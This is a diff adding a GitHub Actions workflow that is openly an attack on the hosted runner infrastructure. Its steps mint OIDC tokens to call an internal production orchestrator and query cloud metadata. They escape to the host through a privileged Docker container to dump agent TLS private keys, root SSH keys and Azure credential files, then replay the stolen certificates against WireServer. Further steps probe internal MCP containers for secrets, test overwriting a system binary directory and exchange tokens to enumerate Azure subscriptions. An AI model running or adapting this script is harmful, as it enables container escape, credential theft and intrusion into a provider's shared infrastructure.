@@ -1,0 +1,224 @@
+name: HC Orchestrator Probe
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  hc-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 1 - Mint HC JWT and call orchestrator
+        run: |
+          set -e
+          echo "=== MINTING OIDC JWT for api://hosted-compute-ro ==="
+          HC_JWT=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
+            | jq -r .value)
+          echo "JWT_LEN=${#HC_JWT}"
+          echo "JWT_HDR=$(echo $HC_JWT | cut -d. -f1)"
+          echo "JWT_PAY_RAW=$(echo $HC_JWT | cut -d. -f2 | base64 -d 2>/dev/null || echo '<decode-failed>')"
+
+          echo ""
+          echo "=== CALLING HC ORCHESTRATOR ROOT ==="
+          curl -sv \
+            -H "Authorization: Bearer $HC_JWT" \
+            -H "Accept: application/json" \
+            "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1" 2>&1 || true
+
+          echo ""
+          echo "=== FETCHING ALLOCATION_ID FROM IMDS TAGS ==="
+          TAGS=$(curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance/compute/tags?api-version=2021-02-01&format=text" || echo "IMDS_TAGS_FAIL")
+          echo "TAGS: $TAGS"
+          ALLOC_ID=$(echo "$TAGS" | tr ';' '\n' | grep allocation_id | cut -d: -f2 | tr -d '[:space:]')
+          echo "ALLOC_ID: $ALLOC_ID"
+
+          if [ -n "$ALLOC_ID" ]; then
+            echo ""
+            echo "=== CALLING HC ORCHESTRATOR /allocations/$ALLOC_ID ==="
+            curl -sv \
+              -H "Authorization: Bearer $HC_JWT" \
+              -H "Accept: application/json" \
+              "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/allocations/$ALLOC_ID" 2>&1 || true
+
+            echo ""
+            echo "=== CALLING HC ORCHESTRATOR /vms (all VM list) ==="
+            curl -sv \
+              -H "Authorization: Bearer $HC_JWT" \
+              -H "Accept: application/json" \
+              "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/vms" 2>&1 || true
+
+            echo ""
+            echo "=== CALLING HC ORCHESTRATOR /queues ==="
+            curl -sv \
+              -H "Authorization: Bearer $HC_JWT" \
+              -H "Accept: application/json" \
+              "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/queues" 2>&1 || true
+
+            echo ""
+            echo "=== CALLING HC ORCHESTRATOR /jobs ==="
+            curl -sv \
+              -H "Authorization: Bearer $HC_JWT" \
+              -H "Accept: application/json" \
+              "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/vm/v1/jobs" 2>&1 || true
+          fi
+
+      - name: 2 - Exfil TransportCerts via Docker escape
+        run: |
+          echo "=== DOCKER ESCAPE - EXFIL WAAGENT CERTS ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            echo '--- TransportCert.pem ---'
+            cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo 'NOT_FOUND'
+            echo '--- TransportPrivate.pem ---'
+            cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo 'NOT_FOUND'
+            echo '--- GoalState.1.xml (first 200 lines) ---'
+            head -200 /host/var/lib/waagent/GoalState.1.xml 2>/dev/null || echo 'NOT_FOUND'
+            echo '--- vmSettings (agent_status channel URL) ---'
+            ls /host/var/lib/waagent/*.prv 2>/dev/null
+            for f in /host/var/lib/waagent/*.prv; do echo \"==$f==\"; cat \$f; done
+            echo '--- OVF-ENV ---'
+            cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null || echo 'NOT_FOUND'
+            echo '--- primer binary permissions ---'
+            ls -la /host/opt/primer/ 2>/dev/null
+            echo '--- /opt/hca contents ---'
+            ls -la /host/opt/hca/ 2>/dev/null
+            echo '--- root SSH keys ---'
+            cat /host/root/.ssh/authorized_keys 2>/dev/null
+            ls -la /host/root/.ssh/ 2>/dev/null
+            echo '--- /root/.azure ---'
+            ls -la /host/root/.azure/ 2>/dev/null
+            cat /host/root/.azure/credentials 2>/dev/null || true
+            cat /host/root/.azure/accessTokens.json 2>/dev/null || true
+          " 2>&1 || true
+
+      - name: 3 - WireServer mTLS probe
+        run: |
+          echo "=== WRITING WAAGENT CERTS TO TMP ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            cat /host/var/lib/waagent/TransportCert.pem
+          " 2>/dev/null > /tmp/tc.pem || echo "cert_exfil_failed"
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            cat /host/var/lib/waagent/TransportPrivate.pem
+          " 2>/dev/null > /tmp/tp.pem || echo "key_exfil_failed"
+
+          echo "=== WIRESERVER HTTP (no auth) ==="
+          curl -sv "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -100 || true
+
+          echo "=== WIRESERVER WITH WAAGENT CERT ==="
+          curl -sv \
+            --cert /tmp/tc.pem \
+            --key /tmp/tp.pem \
+            "http://168.63.129.16/machine?comp=goalstate" 2>&1 | head -100 || true
+
+          echo "=== WIRESERVER vmSettings (agent channel) ==="
+          curl -sv \
+            --cert /tmp/tc.pem \
+            --key /tmp/tp.pem \
+            "http://168.63.129.16:32526/machine?comp=vmSettings" 2>&1 | head -200 || true
+
+      - name: 4 - gh-aw-mcpg container internals
+        run: |
+          echo "=== gh-aw-mcpg CONTAINER INSPECT ==="
+          docker inspect ghcr.io/github/gh-aw-mcpg:latest 2>/dev/null | jq '.[0] | {Config:.Config, Env:.Config.Env, Entrypoint:.Config.Entrypoint, Cmd:.Config.Cmd, Labels:.Config.Labels}' || true
+
+          echo ""
+          echo "=== gh-aw-mcpg CONTAINER RUN ==="
+          docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c "
+            echo '--- id ---'
+            id
+            echo '--- env ---'
+            env | sort
+            echo '--- /app layout ---'
+            ls -la /app/ 2>/dev/null || ls -la / 
+            echo '--- /etc/hosts ---'
+            cat /etc/hosts
+            echo '--- process list ---'
+            ps aux 2>/dev/null || true
+            echo '--- network interfaces ---'
+            ip addr 2>/dev/null || ifconfig 2>/dev/null || true
+            echo '--- certs in container ---'
+            find / -name '*.pem' -o -name '*.key' -o -name '*.crt' 2>/dev/null | head -30
+            echo '--- config files ---'
+            find /app /etc /opt -name '*.json' -o -name '*.yaml' -o -name '*.toml' -o -name '*.env' 2>/dev/null | head -20 | xargs cat 2>/dev/null
+          " 2>&1 || true
+
+          echo ""
+          echo "=== github-mcp-server CONTAINER INSPECT ==="
+          docker run --rm --entrypoint sh ghcr.io/github/github-mcp-server:latest -c "
+            id; env | sort; ls -la /; ls -la /app/ 2>/dev/null
+            find / -name '*.pem' -o -name '*.key' 2>/dev/null | head -20
+          " 2>&1 || true
+
+      - name: 5 - primer poisoning + /opt/hca exploration
+        run: |
+          echo "=== PRIMER BINARY INFO ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            echo '--- /opt/primer perms ---'
+            ls -la /host/opt/primer/
+            echo '--- primer file type ---'
+            file /host/opt/primer/primer 2>/dev/null
+            echo '--- primer strings (first 50 interesting) ---'
+            strings /host/opt/primer/primer 2>/dev/null | grep -iE 'url|http|token|auth|secret|key|host|api|github|azure' | head -50
+            echo '--- /opt/hca contents ---'
+            ls -la /host/opt/hca/
+            echo '--- hca binary strings ---'
+            strings /host/opt/hca/hca 2>/dev/null | grep -iE 'url|http|token|auth|secret|key|host|api|github|azure|orchestrat' | head -50
+            echo '--- hca config files ---'
+            find /host/opt/hca -type f | xargs cat 2>/dev/null
+            echo '--- runner systemd services ---'
+            cat /host/etc/systemd/system/actions.runner*.service 2>/dev/null || true
+            cat /host/etc/systemd/system/hosted-compute*.service 2>/dev/null || true
+            ls /host/etc/systemd/system/ | grep -iE 'runner|hca|primer|github|azure'
+          " 2>&1 || true
+
+          echo ""
+          echo "=== ATTEMPT PRIMER REPLACEMENT (WRITE TEST) ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            echo 'write_test' > /host/opt/primer/PWNED_$(date +%s).txt 2>&1 && echo 'WRITE_OK' || echo 'WRITE_BLOCKED'
+          " 2>&1 || true
+
+      - name: 6 - ARM management token + subscription enumeration
+        run: |
+          echo "=== MINT management.azure.com JWT ==="
+          ARM_JWT=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=management.azure.com" \
+            | jq -r .value)
+          echo "ARM_JWT_LEN=${#ARM_JWT}"
+
+          # Exchange for real ARM token via WIF
+          echo "=== WIF EXCHANGE → ARM ACCESS TOKEN ==="
+          ARM_TOK=$(curl -sf -X POST \
+            "https://login.microsoftonline.com/$(curl -sf -H "Metadata:true" \
+              "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text")/oauth2/v2.0/token" \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+            -d "client_id=477c6e42-e0f3-4a68-b61b-6f3d9399e20c" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            --data-urlencode "client_assertion=$ARM_JWT" \
+            -d "scope=https://management.azure.com/.default" \
+            -d "requested_token_use=on_behalf_of" 2>/dev/null | jq -r .access_token || echo "WIF_FAIL")
+          echo "ARM_TOK_LEN=${#ARM_TOK}"
+
+          if [ "$ARM_TOK" != "WIF_FAIL" ] && [ ${#ARM_TOK} -gt 100 ]; then
+            echo "=== LISTING ALL SUBSCRIPTIONS ==="
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions?api-version=2022-12-01" | jq '.value[] | {id:.id, displayName:.displayName, state:.state}' || true
+
+            echo "=== RUN-COMMAND ON VM (westus2 sub) ==="
+            SUB="e5b640f6"
+            RG_PARTIAL="azure-westus2-general"
+            # Get resource groups
+            curl -sf -H "Authorization: Bearer $ARM_TOK" \
+              "https://management.azure.com/subscriptions?api-version=2022-12-01" | jq -r '.value[].subscriptionId' | while read sid; do
+              curl -sf -H "Authorization: Bearer $ARM_TOK" \
+                "https://management.azure.com/subscriptions/$sid/resourceGroups?api-version=2021-04-01" | jq -r '.value[].name' | head -5
+            done || true
+          else
+            echo "WIF exchange failed, trying raw ARM JWT directly"
+            curl -sf -H "Authorization: Bearer $ARM_JWT" \
+              "https://management.azure.com/subscriptions?api-version=2022-12-01" | jq '.value[] | {id:.id, displayName:.displayName}' || true
+          fi
